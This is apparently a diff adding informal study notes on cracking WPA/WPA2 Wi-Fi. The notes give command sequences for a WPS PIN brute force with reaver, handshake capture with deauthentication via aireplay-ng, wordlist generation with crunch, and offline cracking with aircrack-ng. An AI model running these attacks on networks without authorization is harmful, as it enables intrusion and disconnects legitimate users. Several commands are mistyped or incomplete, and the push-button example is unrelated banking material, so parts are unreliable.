@@ -1,0 +1,83 @@
+WPA/WPA2 Cracking
+both can be cracked using same method
+made to resolve issues in wep 
+more secure
+each packect encrypted using temporary key
+
+packect have no useful info
+
+wps feature help to connect device without password
+authentication done using 8 digit pin
+we can try all combination in small time
+then wps can be used to complete actual password
+method work if router configure not to use push button authentication
+## example push button authentication
+A user tries to log in to their online banking account. After entering their username and password, they receive a push notification on their smartphone. They open the notification, see the details of the login attempt, and press the "Approve" button. The authentication system verifies the approval, and the user is granted access to their account
+
+## METHOD open two terminals 
+put monitor mode wlan0 
+ifconfig wlan0 down
+airmon-ng check kill          
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+wash --interface wlan0 #show network all network near using wps
+aireplay-ng --fakeauth 30 -a bssid -h us device3 mac address wlan0
+   ## 30 sec time
+
+   ##lck sometimes lock after fail attempts 
+   ## cracking not work if push button authentication only method is try attacking
+   ## associate using fake authentication
+   
+## go to second terminal
+reaver --bssid  --channel 11 --interface wlano --vvv --no-associate
+## reaver is a program using brute force to give us key
+## vvv used to tell detail to show us as much information as possible.This is really helpful. If it fails or things go wrong .able to know what's happening. stop associate as we aqre doing up manually.
+first hit enter second terminal
+
+this method not work for new router but u can try it if works good luck
+
+
+CAPTURING HANDSHAKE
+wep weakness were fixed 
+packect have no used full data key changes
+packing aid us in hacking are handshake
+handshake 4 packects sent to a clients connect to network
+
+method
+## put wireless adapter monitor mode
+## open two terminal
+airodump-ng wlan0 ## see network
+airodum-ng -bssid --channel --write handshake wlan0
+enter
+## write command in second terminal
+aireplay-ng --deauth 4 -a bssid -c mac client wlan0 ##enter
+
+##on first terminal handshake would be shown copy it
+
+NOTE: handshake dose not contain data it checks whether password valid or not
+
+Create Wordlist skill used in pen testing
+syntax crunch[min][max]-t[]-0[filename]
+crunch 6 8 123abc$ -owordlist -ta99j
+ 
+ #man crunch shows all commands making different passwords
+crunch 6 8 abc12 -o test.txt
+cat test.txt
+#to show passwords
+
+and we are ready to go and crack the password.
+
+ Aircrack-ng is going to unpack the handshake
+The MIC the message integrity code
+is what's used by the access point
+to verify whether a password is correct or not.
+
+if the MIC generated using this information + the first password is the same
+then the password used to generate this MIC Otherwise this password is wrong
+and it will move to the next password.
+repeat process
+until they use all of this information
+
+aircrack-ng wpa_handshake-01.cap -w test.txt run this command 
+#test each password if mic correct u get password
+
